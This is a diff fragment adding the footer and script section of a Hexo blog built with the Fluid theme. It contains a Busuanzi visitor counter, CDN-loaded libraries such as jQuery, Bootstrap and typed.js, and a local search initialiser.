+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
